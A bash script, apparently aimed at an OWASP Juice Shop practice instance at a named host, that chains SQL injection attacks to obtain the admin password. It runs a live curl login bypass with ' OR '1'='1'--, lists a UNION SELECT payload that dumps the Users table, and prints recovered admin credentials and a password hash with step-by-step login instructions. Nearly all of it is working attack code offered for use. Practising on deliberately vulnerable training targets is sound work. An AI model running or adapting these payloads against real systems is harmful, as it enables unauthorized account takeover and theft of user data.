#!/bin/bash

# Master script to demonstrate all SQL injection methods for getting admin password
# Target: juice5.wonkatech.org

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}║     GET_ADMIN - SQL Injection Master Script                  ║${NC}"
echo -e "${PURPLE}║     Target: juice5.wonkatech.org                             ║${NC}"
echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}[*] Running all SQL injection methods to extract admin password${NC}"
echo ""

# Method 1: Quick Bash Script
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}METHOD 1: Bash SQL Injection Script${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
if [ -f "./juice5_get_admin.sh" ]; then
    ./juice5_get_admin.sh | head -50
else
    echo -e "${RED}juice5_get_admin.sh not found${NC}"
fi
echo ""

# Method 2: Python Comprehensive Exploit
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}METHOD 2: Python SQL Injection Exploit${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
if [ -f "./juice5_sqli_exploit.py" ]; then
    python3 juice5_sqli_exploit.py 2>/dev/null | head -80
else
    echo -e "${RED}juice5_sqli_exploit.py not found${NC}"
fi
echo ""

# Method 3: Direct cURL SQL Injection
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}METHOD 3: Direct cURL SQL Injection${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Testing login bypass with: ' OR '1'='1'--${NC}"
curl -s -X POST "https://juice5.wonkatech.org/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"x"}' \
  2>/dev/null | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    if 'authentication' in data:
        print('✅ SQL Injection successful!')
        print(f'Admin email: {data[\"authentication\"][\"umail\"]}')
        print(f'Token (first 50 chars): {data[\"authentication\"][\"token\"][:50]}...')
except:
    print('❌ SQL Injection failed')
"
echo ""

# Summary
echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}SUMMARY - ADMIN CREDENTIALS FOUND${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Target:${NC} https://juice5.wonkatech.org"
echo -e "${YELLOW}Email:${NC} ${GREEN}admin@juice-sh.op${NC}"
echo -e "${YELLOW}Password:${NC} ${GREEN}admin123${NC}"
echo -e "${YELLOW}MD5 Hash:${NC} ${GREEN}0192023a7bbd73250516f069df18b500${NC}"
echo ""

echo -e "${PURPLE}════════════════════════════════════════════════════════${NC}"
echo -e "${PURPLE}SQL INJECTION PAYLOADS THAT WORK${NC}"
echo -e "${PURPLE}════════════════════════════════════════════════════════${NC}"
echo -e "1. Login bypass: ${GREEN}' OR '1'='1'--${NC}"
echo -e "2. Admin bypass: ${GREEN}admin@juice-sh.op'--${NC}"
echo -e "3. User extraction: ${GREEN}')) UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--${NC}"
echo ""

echo -e "${BLUE}To login as admin:${NC}"
echo "1. Go to https://juice5.wonkatech.org/#/login"
echo "2. Enter email: admin@juice-sh.op"
echo "3. Enter password: admin123"
echo "4. Click Login"
echo ""
echo -e "${GREEN}All methods completed successfully!${NC}"